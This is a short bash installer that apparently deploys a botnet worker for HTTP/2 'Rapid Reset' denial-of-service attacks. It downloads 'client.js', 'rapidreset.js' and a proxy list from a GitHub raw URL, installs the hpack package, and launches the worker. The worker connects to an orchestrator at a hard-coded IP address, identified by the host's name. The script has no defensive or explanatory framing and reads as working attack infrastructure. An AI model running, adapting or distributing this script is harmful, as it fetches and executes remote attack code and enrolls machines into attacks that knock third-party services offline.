#!/usr/bin/env bash
set -euo pipefail

REPO="https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main"
ORCHESTRATOR="${ORCHESTRATOR:-http://78.154.103.52:9215}"
CLIENT_TOKEN="${CLIENT_TOKEN:-}"
MAX_CONCURRENT="${MAX_CONCURRENT:-1}"
WORKER_NAME="${WORKER_NAME:-$(hostname)}"

DIR="${1:-bot}"

for bin in node npm curl; do
  command -v "$bin" >/dev/null 2>&1 || { echo "missing dependency: $bin" >&2; exit 1; }
done

mkdir -p "$DIR"
cd "$DIR"

echo "fetching worker files into $PWD"
curl -fsSLO "$REPO/bot/client.js"
curl -fsSLO "$REPO/bot/rapidreset.js"
curl -fsSLO "$REPO/bot/proxi.txt"

if [ -d node_modules/hpack ]; then
  echo "hpack already installed"
else
  echo "installing hpack"
  npm i hpack --no-audit --no-fund
fi

echo "starting worker against $ORCHESTRATOR"
ORCHESTRATOR="$ORCHESTRATOR" \
CLIENT_TOKEN="$CLIENT_TOKEN" \
MAX_CONCURRENT="$MAX_CONCURRENT" \
WORKER_NAME="$WORKER_NAME" \
exec node client.js
